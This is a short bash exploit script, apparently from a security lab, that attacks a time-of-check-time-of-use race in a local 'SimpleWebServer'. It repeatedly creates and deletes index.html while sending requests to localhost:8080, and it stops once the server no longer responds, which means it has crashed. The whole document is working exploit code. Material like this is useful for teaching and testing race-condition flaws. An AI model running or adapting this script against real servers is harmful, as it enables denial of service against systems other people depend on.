#!/usr/bin/env bash

# This is just a simple Time of check-Time of use vulnerability.
# We request the file, the server checks if it exists, it does, and then we delete before it can read from it.

echo "Exploiting SimpleWebServer"

while true; do
  echo -n .
  touch index.html
  curl -so /dev/null http://localhost:8080&
  pid=$!
  sleep 0.0015
  rm index.html
  wait $pid
  curl -so /dev/null http://localhost:8080 || break
done;

rm index.html

echo "TOCTOU Exploit successful"
